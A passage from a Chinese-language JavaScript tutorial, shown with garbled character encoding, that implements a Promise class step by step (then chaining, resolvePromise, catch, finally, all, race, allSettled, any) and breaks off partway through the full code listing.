            <span class="hljs-comment">// 3ã€è°ƒç”¨å¤±è´¥å›è°ƒå‡½æ•°</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">item</span>(reason));
            }
        }
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ‰§è¡Œå™¨å‡½æ•°executoræ˜¯åŒæ­¥è°ƒç”¨</span>
            <span class="hljs-title function_">executor</span>(resolve, reject);
        }
        <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-comment">// æ‰§è¡Œå™¨æŠ›å‡ºçš„å¼‚å¸¸ç›´æ¥reject</span>
            <span class="hljs-title function_">reject</span>(e);
        }
    }
}
</code></pre>
<h4 data-id="heading-5">å…³é”®ç‚¹è§£æ</h4>
<ul>
<li>çŠ¶æ€æœºï¼šä½¿ç”¨promiseStateè®°å½•å½“å‰çŠ¶æ€ï¼Œå½“çŠ¶æ€ä¸ä¸º'pending'æ—¶ï¼Œè¯´æ˜çŠ¶æ€å·²ç»æ”¹å˜è¿‡äº†ï¼Œç›´æ¥è¿”å›ï¼Œä¸è¿›è¡Œä»»ä½•å¤„ç†ï¼›å¦åˆ™ï¼Œæ‰è¿›è¡Œä¿®æ”¹çŠ¶æ€ã€ä¿å­˜ç»“æœã€æ‰§è¡Œè°ƒç”¨ç­‰æ“ä½œã€‚</li>
<li>ç»“æœå­˜å‚¨ï¼špromiseResultå­˜å‚¨æˆåŠŸå€¼æˆ–å¤±è´¥åŸå› ã€‚</li>
<li>å›è°ƒé˜Ÿåˆ—ï¼šç»´æŠ¤æˆåŠŸå’Œå¤±è´¥å›è°ƒé˜Ÿåˆ—ï¼Œæ”¯æŒå¤šæ¬¡thenè°ƒç”¨ã€‚</li>
<li>å¼‚æ­¥æ‰§è¡Œï¼šä½¿ç”¨setTimeoutç¡®ä¿å›è°ƒå¼‚æ­¥æ‰§è¡Œã€‚</li>
</ul>
<h2 data-id="heading-6">é“¾å¼è°ƒç”¨æ ¸å¿ƒå®ç°</h2>
<h3 data-id="heading-7">then()æ–¹æ³•çš„åŸºæœ¬ç»“æ„</h3>
<h4 data-id="heading-8">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">then</span>(<span class="hljs-params">onResolved, onRejected</span>) {
    <span class="hljs-comment">// å¦‚æœä¸æ˜¯å‡½æ•°åˆ™åˆ›å»ºä¸€ä¸ªé»˜è®¤å‡½æ•°</span>
    onResolved = <span class="hljs-keyword">typeof</span> onResolved === <span class="hljs-string">'function'</span> ? onResolved : <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> value;
    onRejected = <span class="hljs-keyword">typeof</span> onRejected === <span class="hljs-string">'function'</span> ? onRejected : <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> { <span class="hljs-keyword">throw</span> reason };

    <span class="hljs-comment">// è¿”å›æ–°çš„Promise</span>
    <span class="hljs-keyword">const</span> promise2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-comment">// å¤„ç†resolvedçŠ¶æ€çš„å‡½æ•°</span>
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResolved</span> = (<span class="hljs-params"/>) =&gt; {
            <span class="hljs-comment">// ä½¿ç”¨setTimeoutç¡®ä¿å¼‚æ­¥æ‰§è¡Œ</span>
            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">onResolved</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span>);
                    <span class="hljs-comment">// å¤„ç†è¿”å›å€¼ï¼Œå¯èƒ½æ˜¯æ™®é€šå€¼æˆ–Promise</span>
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, x, resolve, reject);
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">reject</span>(error);
                }
            }, <span class="hljs-number">0</span>);
        };

        <span class="hljs-comment">// å¤„ç†rejectedçŠ¶æ€çš„å‡½æ•°</span>
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleRejected</span> = (<span class="hljs-params"/>) =&gt; {
            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">onRejected</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span>);
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, x, resolve, reject);
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">reject</span>(error);
                }
            }, <span class="hljs-number">0</span>);
        };

        <span class="hljs-comment">// æ ¹æ®å½“å‰çŠ¶æ€å¤„ç†</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'fulfilled'</span>) {
            <span class="hljs-title function_">handleResolved</span>();
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'rejected'</span>) {
            <span class="hljs-title function_">handleRejected</span>();
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'pending'</span>) {
            <span class="hljs-comment">// å¦‚æœæ˜¯pendingçŠ¶æ€ï¼Œå°†å›è°ƒå‡½æ•°å­˜å‚¨èµ·æ¥</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleResolved</span>());
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleRejected</span>());
        }
    });

    <span class="hljs-keyword">return</span> promise2;
}
</code></pre>
<h4 data-id="heading-9">å…³é”®ç‚¹è§£æ</h4>
<ul>
<li>å€¼é€ä¼ ï¼šå¦‚æœ <code>onResolved</code> ä¸æ˜¯å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªè¿”å›åŸå€¼çš„å‡½æ•° <code>value =&gt; value</code> ã€‚</li>
<li>é”™è¯¯å†’æ³¡ï¼šå¦‚æœ <code>onRejected</code> ä¸æ˜¯å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªæŠ›å‡ºé”™è¯¯çš„å‡½æ•°ï¼Œè®©é”™è¯¯ç»§ç»­å‘ä¸‹ä¼ é€’ã€‚</li>
<li>é“¾å¼è°ƒç”¨çš„åŸºç¡€ï¼šæ¯ä¸ª then å¿…é¡»è¿”å›æ–°çš„ Promiseï¼Œä¸”è¿”å›çš„ Promise æ˜¯ç‹¬ç«‹çš„ï¼ŒçŠ¶æ€ä¸å—å‰ä¸€ä¸ª Promise å½±å“ã€‚</li>
<li>å¼‚æ­¥æ‰§è¡ŒåŒ…è£…å™¨ï¼ˆhandleResolved/handleRejectedï¼‰ï¼šæ¨¡æ‹Ÿå¾®ä»»åŠ¡è¡Œä¸ºï¼Œç¡®ä¿å›è°ƒå‡½æ•°æ€»æ˜¯å¼‚æ­¥æ‰§è¡Œã€‚</li>
</ul>
<h3 data-id="heading-10">Promiseè§£æè¿‡ç¨‹ï¼ˆæ ¸å¿ƒéš¾ç‚¹ï¼‰</h3>
<h4 data-id="heading-11">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">resolvePromise</span>(<span class="hljs-params">promise2, x, resolve, reject</span>) {
    <span class="hljs-comment">// é˜²æ­¢å¾ªç¯å¼•ç”¨</span>
    <span class="hljs-keyword">if</span> (promise2 === x) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Chaining cycle detected for promise'</span>));
    }

    <span class="hljs-comment">// æ ‡è®°æ˜¯å¦å·²è¢«è°ƒç”¨ï¼Œé˜²æ­¢å¤šæ¬¡è°ƒç”¨</span>
    <span class="hljs-keyword">let</span> called = <span class="hljs-literal">false</span>;

    <span class="hljs-keyword">if</span> (x !== <span class="hljs-literal">null</span> &amp;&amp; (<span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'function'</span>)) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è·å–thenæ–¹æ³•</span>
            <span class="hljs-keyword">const</span> then = x.<span class="hljs-property">then</span>;

            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> then === <span class="hljs-string">'function'</span>) {
                <span class="hljs-comment">// å¦‚æœxæœ‰thenæ–¹æ³•ï¼Œåˆ™å°†å…¶è§†ä¸ºPromise</span>
                then.<span class="hljs-title function_">call</span>(
                    x,
                    <span class="hljs-comment">// resolvePromise</span>
                    <span class="hljs-function"><span class="hljs-params">y</span> =&gt;</span> {
                        <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                        called = <span class="hljs-literal">true</span>;
                        <span class="hljs-comment">// é€’å½’è§£æ</span>
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, y, resolve, reject);
                    },
                    <span class="hljs-comment">// rejectPromise</span>
                    <span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> {
                        <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                        called = <span class="hljs-literal">true</span>;
                        <span class="hljs-title function_">reject</span>(r);
                    }
                );
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// å¦‚æœxæ˜¯æ™®é€šå¯¹è±¡æˆ–å‡½æ•°ï¼Œç›´æ¥resolve</span>
                <span class="hljs-title function_">resolve</span>(x);
            }
        } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
            called = <span class="hljs-literal">true</span>;
            <span class="hljs-title function_">reject</span>(error);
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¦‚æœxæ˜¯åŸºæœ¬ç±»å‹ï¼Œç›´æ¥resolve</span>
        <span class="hljs-title function_">resolve</span>(x);
    }
}
</code></pre>
<h4 data-id="heading-12">ä¸ºä»€ä¹ˆéœ€è¦resolvePromise</h4>
<ul>
<li>é˜²æ­¢å¾ªç¯å¼•ç”¨å¯¼è‡´çš„æ— é™é€’å½’ã€‚</li>
<li>ç¡®ä¿ Promise è§£æè¿‡ç¨‹ç¬¦åˆè§„èŒƒã€‚</li>
</ul>
<blockquote>
<p>è¿™éƒ¨åˆ†ï¼Œæˆ‘è®¤ä¸ºæ˜¯ Promise å®ç°ä¸­æœ€å¤æ‚çš„éƒ¨åˆ†ï¼</p>
</blockquote>
<h2 data-id="heading-13">å®ä¾‹æ–¹æ³•å®ç°</h2>
<h3 data-id="heading-14">catch()æ–¹æ³•</h3>
<h4 data-id="heading-15">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">catch</span>(onRejected) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>(<span class="hljs-literal">null</span>, onRejected);
}
</code></pre>
<h3 data-id="heading-16">finally()æ–¹æ³•</h3>
<h4 data-id="heading-17">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">finally</span>(<span class="hljs-params">onFinally</span>) {
    <span class="hljs-comment">// éœ€è¦å…ˆæ£€æŸ¥ onFinally æ˜¯å¦ä¸ºå‡½æ•°</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> onFinally !== <span class="hljs-string">'function'</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>(
        <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFinally</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> value),
        <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFinally</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-keyword">throw</span> reason })
    );
}
</code></pre>
<h2 data-id="heading-18">é™æ€æ–¹æ³•å®ç°</h2>
<h3 data-id="heading-19">Promise.resolve() / Promise.reject()</h3>
<h4 data-id="heading-20">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-comment">// å¦‚æœå·²ç»æ˜¯Promiseå®ä¾‹ï¼Œç›´æ¥è¿”å›</span>
    <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Promise</span>) {
        <span class="hljs-keyword">return</span> value;
    }

    <span class="hljs-comment">// æ™®é€šå€¼</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
        <span class="hljs-title function_">resolve</span>(value);
    });
}

<span class="hljs-comment">// Promiseé™æ€æ–¹æ³•reject</span>
<span class="hljs-keyword">static</span> <span class="hljs-title function_">reject</span>(<span class="hljs-params">reason</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> {
        <span class="hljs-title function_">reject</span>(reason);
    });
}
</code></pre>
<blockquote>
<p>ä»ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼šresolve() æ–¹æ³•æ¯” reject() æ–¹æ³•å¤šäº†ä¸€å±‚åˆ¤æ–­é€»è¾‘ï¼Œå³ï¼š<code>å¦‚æœå·²ç»æ˜¯Promiseå®ä¾‹ï¼Œç›´æ¥è¿”å›</code> ï¼Œè¿™éƒ¨åˆ†ä»£ç å¯ä»¥ä¿éšœ <code>Promise.resolve()</code> æ–¹æ³•çš„å¹‚ç­‰æ€§ã€‚</p>
</blockquote>
<h3 data-id="heading-21">Promise.all()ï¼šæ‰€æœ‰æˆåŠŸï¼Œæ‰ç®—æˆåŠŸ</h3>
<h4 data-id="heading-22">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">all</span>(<span class="hljs-params">promises</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»æ˜¯æ•°ç»„'</span>));
        }

        <span class="hljs-keyword">const</span> results = [];
        <span class="hljs-keyword">let</span> completedCount = <span class="hljs-number">0</span>;

        promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
            <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
                    results[index] = value;
                    completedCount++;

                    <span class="hljs-keyword">if</span> (completedCount === promises.<span class="hljs-property">length</span>) {
                        <span class="hljs-title function_">resolve</span>(results);
                    }
                },
                reject  <span class="hljs-comment">// ç›´æ¥ä¼ é€’rejectå‡½æ•°</span>
            );
        });
    });
}
</code></pre>
<h3 data-id="heading-23">Promise.race()ï¼šç«é€Ÿï¼Œè°æœ€å…ˆå®Œæˆ</h3>
<h4 data-id="heading-24">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">race</span>(<span class="hljs-params">promises</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»æ˜¯æ•°ç»„'</span>));
        }

        promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">promise</span> =&gt;</span> {
            <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(resolve, reject);
        });
    });
}
</code></pre>
<h3 data-id="heading-25">Promise.allSettled()ï¼šå…¨éƒ¨å®Œæˆï¼Œè®°å½•æ‰€æœ‰ç»“æœ</h3>
<h4 data-id="heading-26">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">allSettled</span>(<span class="hljs-params">promises</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»æ˜¯æ•°ç»„'</span>));
        }

        <span class="hljs-keyword">const</span> results = [];
        <span class="hljs-keyword">let</span> completedCount = <span class="hljs-number">0</span>;

        <span class="hljs-keyword">const</span> <span class="hljs-title function_">processResult</span> = (<span class="hljs-params">index, value, status</span>) =&gt; {
            results[index] = status === <span class="hljs-string">'fulfilled'</span>
                ? { <span class="hljs-attr">status</span>: <span class="hljs-string">'fulfilled'</span>, value }
                : { <span class="hljs-attr">status</span>: <span class="hljs-string">'rejected'</span>, <span class="hljs-attr">reason</span>: value };

            completedCount++;

            <span class="hljs-keyword">if</span> (completedCount === promises.<span class="hljs-property">length</span>) {
                <span class="hljs-title function_">resolve</span>(results);
            }
        };

        promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
            <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-title function_">processResult</span>(index, value, <span class="hljs-string">'fulfilled'</span>),
                <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> <span class="hljs-title function_">processResult</span>(index, reason, <span class="hljs-string">'rejected'</span>)
            );
        });
    });
}
</code></pre>
<h3 data-id="heading-27">Promise.any()ï¼šä»»æ„ä¸€ä¸ªæˆåŠŸï¼Œéƒ½ç®—æˆåŠŸ</h3>
<h4 data-id="heading-28">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">any</span>(<span class="hljs-params">promises</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'å‚æ•°å¿…é¡»æ˜¯æ•°ç»„'</span>));
        }

        <span class="hljs-keyword">const</span> errors = [];
        <span class="hljs-keyword">let</span> rejectedCount = <span class="hljs-number">0</span>;

        promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
            <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
                    <span class="hljs-title function_">resolve</span>(value);
                },
                <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> {
                    errors[index] = reason;
                    rejectedCount++;
                    <span class="hljs-keyword">if</span> (rejectedCount === promises.<span class="hljs-property">length</span>) {
                        <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AggregateError</span>(errors, <span class="hljs-string">'æ‰€æœ‰Promiseéƒ½è¢«æ‹’ç»'</span>));
                    }
                }
            );
        });
    });
}
</code></pre>
<h2 data-id="heading-29">å®Œæ•´ä»£ç </h2>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Promise</span> {
    <span class="hljs-comment">// æ„é€ å‡½æ•°æ¥æ”¶ä¸€ä¸ªæ‰§è¡Œå™¨å‡½æ•°executor</span>
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) {

        <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'pending'</span>;  <span class="hljs-comment">// å£°æ˜åˆå§‹çŠ¶æ€</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// Priomiseç»“æœ</span>
        <span class="hljs-comment">// å­˜å‚¨æˆåŠŸå’Œå¤±è´¥çš„å›è°ƒå‡½æ•°</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span> = [];
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span> = [];

        <span class="hljs-comment">// å£°æ˜resolveå’Œrejectä¸¤ä¸ªå‡½æ•°</span>
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolve</span> = (<span class="hljs-params">value</span>) =&gt; {
            <span class="hljs-comment">// åˆ¤æ–­çŠ¶æ€æ˜¯å¦ä¸ºpending</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> !== <span class="hljs-string">'pending'</span>) <span class="hljs-keyword">return</span>;
            <span class="hljs-comment">// 1ã€ä¿®æ”¹å¯¹è±¡çŠ¶æ€</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'fulfilled'</span>;
            <span class="hljs-comment">// 2ã€ä¿å­˜æˆåŠŸå€¼</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = value;
            <span class="hljs-comment">// 3ã€è°ƒç”¨æˆåŠŸå›è°ƒå‡½æ•°</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">item</span>(value));
            }
        }
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">reject</span> = (<span class="hljs-params">reason</span>) =&gt; {
            <span class="hljs-comment">// åˆ¤æ–­çŠ¶æ€æ˜¯å¦ä¸ºpending</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> !== <span class="hljs-string">'pending'</span>) <span class="hljs-keyword">return</span>;
            <span class="hljs-comment">// 1ã€ä¿®æ”¹å¯¹è±¡çŠ¶æ€</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'rejected'</span>;
            <span class="hljs-comment">// 2ã€ä¿å­˜å¤±è´¥åŸå› </span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = reason;
            <span class="hljs-comment">// 3ã€è°ƒç”¨å¤±è´¥å›è°ƒå‡½æ•°</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">item</span>(reason));
            }
        }
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ‰§è¡Œå™¨å‡½æ•°executoræ˜¯åŒæ­¥è°ƒç”¨</span>
            <span class="hljs-title function_">executor</span>(resolve, reject);
        }
        <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-comment">// æ‰§è¡Œå™¨æŠ›å‡ºçš„å¼‚å¸¸ç›´æ¥reject</span>
            <span class="hljs-title function_">reject</span>(e);
        }
    }

    <span class="hljs-comment">// thenæ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå‚æ•°onResolvedå’ŒonRejected</span>
    <span class="hljs-title function_">then</span>(<span class="hljs-params">onResolved, onRejected</span>) {
        <span class="hljs-comment">// å¦‚æœä¸æ˜¯å‡½æ•°åˆ™åˆ›å»ºä¸€ä¸ªé»˜è®¤å‡½æ•°</span>
        onResolved = <span class="hljs-keyword">typeof</span> onResolved === <span class="hljs-string">'function'</span> ? onResolved : <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> value;
        onRejected = <span class="hljs-keyword">typeof</span> onRejected === <span class="hljs-string">'function'</span> ? onRejected : <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> { <span class="hljs-keyword">throw</span> reason };

        <span class="hljs-comment">// è¿”å›æ–°çš„Promise</span>
        <span class="hljs-keyword">const</span> promise2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-comment">// å¤„ç†resolvedçŠ¶æ€çš„å‡½æ•°</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResolved</span> = (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-comment">// ä½¿ç”¨setTimeoutç¡®ä¿å¼‚æ­¥æ‰§è¡Œ</span>
                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">onResolved</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span>);
                        <span class="hljs-comment">// å¤„ç†è¿”å›å€¼ï¼Œå¯èƒ½æ˜¯æ™®é€šå€¼æˆ–Promise</span>
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, x, resolve, reject);
                    } <span class="hljs-keyword">catch</span> (error) {
                        <span class="hljs-title function_">reject</span>(error);
                    }
                }, <span class="hljs-number">0</span>);
            };

            <span class="hljs-comment">// å¤„ç†rejectedçŠ¶æ€çš„å‡½æ•°</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleRejected</span> = (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">onRejected</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span>);
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, x, resolve, reject);
                    } <span class="hljs-keyword">catch</span> (error) {
                        <span class="hljs-title function_">reject</span>(error);
                    }
                }, <span class="hljs-number">0</span>);
            };

            <span class="hljs-comment">// æ ¹æ®å½“å‰çŠ¶æ€å¤„ç†</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'fulfilled'</span>) {
                <span class="hljs-title function_">handleResolved</span>();
